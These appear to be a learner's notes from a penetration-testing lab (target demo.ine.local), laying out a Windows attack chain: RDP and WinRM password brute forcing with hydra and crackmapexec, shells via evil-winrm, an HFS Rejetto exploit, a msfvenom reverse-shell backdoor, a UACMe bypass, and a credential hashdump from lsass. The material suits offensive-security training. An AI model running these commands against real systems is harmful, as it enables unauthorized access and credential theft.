The webdav, smb with  PsExec are in Assesment methodologies in Webserver enumeration and smb enumeration
From smb we can exploit eternal blue vuln also

RDP uses port no:3389 
it uses a legitimate user authentication to log in you need username and password
bruteforce on rdp

Dictionaries to use:

/usr/share/metasploit-framework/data/wordlists/common_users.txt
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

rdp running in non-standard ports other than 3389 then using the msfconsole search for the rdp_scanner use it
it will confirm whether the device is using rdp or not

now bruteforce the rdp users and passwords   using hydra
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://demo.ine.local -s 3333

to login with rdp here we use the xfreerdp to connect
xfreerdp /u:administrator /p:qwertyuiop /v:domain:port #login
boom logged in
go and find flags


exploiting winrm:
winrm is windows remote management protocol used to faciliate the remote access with windows system over https

winrm is used in following ways
Remotely access and interact with windows hosts on a local network
remotely access and executr commands on windows systems
manage and configure windows systems remotely
winrm uses port 5985 and 5986.
we use crackmapexec to perform brute-force on winRm in order to users and there paswords
we can also utilze a ruby script call evil-winrm to obtain a command shell


nmap -sV -p 5985 demo.ine.local
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-04 14:04 IST
Nmap scan report for demo.ine.local (10.3.17.136)
Host is up (0.0033s latency).

PORT     STATE SERVICE VERSION
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

crackmapexec winrm demo.ine.local -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 
//to bruteforce
[+] server\administrator:tinkerbell (Pwn3d!)

crackmapexec winrm demo.ine.local -u administrator -p tinkerbell -x "whomai"
"OR"
evil-winrm -i demo.ine.local -u administrator -p 'tinkerbell'
you will get the shell

UAC:
User Account Control (UAC) is a Windows security feature that prevents unauthorized, system-wide changes by prompting for administrator permission before allowing apps or users to modify critical system settings.

Scan the target
we found the hfs http-file-server
so we use the exploit hfs which is rejetto (the fileserver used by the webpage)
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS demo.ine.local
exploit
getuid
sysinfo
getsystem to see whether we have the high priviliges or not in this case we dont have the privileges
take shell
net localgroup administrators
here admin,administrators are the members we dont have the enough permissions
with help of UACMEtool we are going to bypass User Access Cintrol for Admin user 
Generating malicious exe file using msfvenom in a new tab

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Attackers_ip> LPORT=1234 -f exe > 'backdoor.exe'

The UACMe tool located in "/root/Desktop/tools/UACME/" directory.

now in the hfs meterpreter upload the upload /root/Desktop/tools/UACME/Akagi64.exe 
upload /root/backdoor.exe 

in the msfvenom tab msfconsole 
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <Attackers_ip>
set LPORT 1234
exploit
this acts as a listener

now switch to meterpreter 
shell
Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
go to listener
We have successfully gained high privilege access. Dump the user hashes.
ps -S lsass.exe
migrate pid
hashdump boom



